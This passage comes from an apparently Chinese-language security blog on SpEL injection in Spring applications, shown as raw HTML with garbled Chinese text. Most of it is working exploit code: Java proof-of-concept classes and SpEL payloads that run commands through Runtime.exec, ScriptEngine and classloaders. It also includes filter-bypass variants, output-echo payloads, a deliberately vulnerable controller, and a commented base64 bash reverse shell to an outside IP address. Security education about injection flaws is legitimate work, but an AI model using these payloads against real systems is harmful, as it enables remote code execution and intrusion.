punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"T(java.lang.Runtime).getRuntime().exec('calc')"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºè§£æå™¨</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§£æè¡¨è¾¾å¼</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¼¹å‡ºè®¡ç®—å™¨</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="ScriptEngine"><a href="#ScriptEngine" class="headerlink" title="ScriptEngine"></a>ScriptEngine</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);\")"</span><span class="token punctuation">;</span><span class="token comment">// engineä¹Ÿå¯ä»¥ç”¨javascript</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºè§£æå™¨</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§£æè¡¨è¾¾å¼</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¼¹å‡ºè®¡ç®—å™¨</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„è¿™é‡Œä¸æ˜¯<code>T()</code>ï¼Œå› ä¸º <code>getEngineByName</code> ä¸æ˜¯ static æ–¹æ³•ï¼Œä¸è¿‡å¯ä»¥ç›´æ¥new</p><hr><h2 id="RCE-ver2â€”â€”è¿œç¨‹ç±»åŠ è½½"><a href="#RCE-ver2â€”â€”è¿œç¨‹ç±»åŠ è½½" class="headerlink" title="RCE ver2â€”â€”è¿œç¨‹ç±»åŠ è½½"></a>RCE ver2â€”â€”è¿œç¨‹ç±»åŠ è½½</h2><h3 id="UrlClassloader"><a href="#UrlClassloader" class="headerlink" title="UrlClassloader"></a>UrlClassloader</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL('http://127.0.0.1:8888/')&#125;).loadClass(\"evil\").newInstance()"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºè§£æå™¨</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§£æè¡¨è¾¾å¼</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¼¹å‡ºè®¡ç®—å™¨</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ¬åœ°æ¶æ„ç±»ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> evil <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//Runtime.getRuntime().exec("bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE2LjExOS4yNTMvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;");</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="AppClassloader"><a href="#AppClassloader" class="headerlink" title="AppClassloader"></a>AppClassloader</h3><p>è·å–ClassLoaderå»åŠ è½½æœ¬åœ°çš„ç±»</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('calc')"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºè§£æå™¨</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§£æè¡¨è¾¾å¼</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¼¹å‡ºè®¡ç®—å™¨</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h4><p>è·å–classloaderå…³é”®å­—ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span>Expression</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span>#thymeleaf æƒ…å†µä¸‹<span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>thymeleaf<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span>AbstractEngineContext</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span>#webæœåŠ¡ä¸‹é€šè¿‡å†…ç½®å¯¹è±¡<span class="token punctuation">&#123;</span>request<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>\"<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>\"<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>\"getRuntime\"<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>\"touch<span class="token operator">/</span>tmp<span class="token operator">/</span>foobar\"<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>username<span class="token punctuation">[</span>#<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"javax.script.ScriptEngineManager"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"js"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime.getRuntime().exec('xterm')"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>asdf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="RCE-ver3â€”â€”å›æ˜¾"><a href="#RCE-ver3â€”â€”å›æ˜¾" class="headerlink" title="RCE ver3â€”â€”å›æ˜¾"></a>RCE ver3â€”â€”å›æ˜¾</h2><p>æ¼æ´ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span></span><span class="token class-name">SpelParserConfiguration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> spelcontroller <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/spel"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">spelvul</span><span class="token punctuation">(</span><span class="token class-name">String</span> payload<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">//String cmdStr = "T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('calc')";</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SpelParserConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºè§£æå™¨</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§£æè¡¨è¾¾å¼</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BufferedReader"><a href="#BufferedReader" class="headerlink" title="BufferedReader"></a>BufferedReader</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">payload<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStreamReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> <span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…¶å®è¿™å¹¶ä¸æ˜¯çº¯ç²¹çš„å›æ˜¾ï¼Œå› ä¸ºä½ éœ€è¦returnè¿™ä¸ªè¿”å›ç»“æœï¼Œè€ŒçœŸå®æƒ…å†µä¸€èˆ¬æ˜¯ä¸ä¼šreturnè¿™ä¸ªç»“æœçš„</p><hr><h3 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">payload<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> <span class="token string">"dir"</span><span class="token punctuation">,</span> <span class="token string">".\\"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"GBK"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"asdasdasdasd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œçš„<code>Delimiter</code>æ˜¯åˆ†éš”ç¬¦çš„æ„æ€ï¼Œæˆ‘ä»¬æ‰§è¡Œäº†diræŒ‡ä»¤ï¼Œå‡å¦‚æƒ³è®©å›æ˜¾å…¨éƒ¨æ˜¾ç¤ºåœ¨ä¸€è¡Œã€‚é‚£ä¹ˆæˆ‘ä»¬ç»™ä¸€ç‚¹ä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿å³å¯</p><hr><h3 id="ResponseHeader"><a href="#ResponseHeader" class="headerlink" title="ResponseHeader"></a>ResponseHeader</h3><p>é€šç”¨å›æ˜¾</p><p>è¿™ç§æ–¹æ³•éœ€è¦æœ‰ä¸€ä¸ªæ–¹æ³•å¯ä»¥<code>addHeader</code>ï¼Œå¯æ˜¯springbootå¹¶ä¸è‡ªå¸¦è¿™ä¸ªæ–¹æ³•ã€‚å› æ­¤è·å–åˆ°Responseæœ‰äº›è®¸å›°éš¾ï¼Œéœ€è¦æ³¨å†Œä¸€ä¸ªresponseè¿›ä¸Šä¸‹æ–‡</p><p>ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> spelcontroller <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/spel"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token 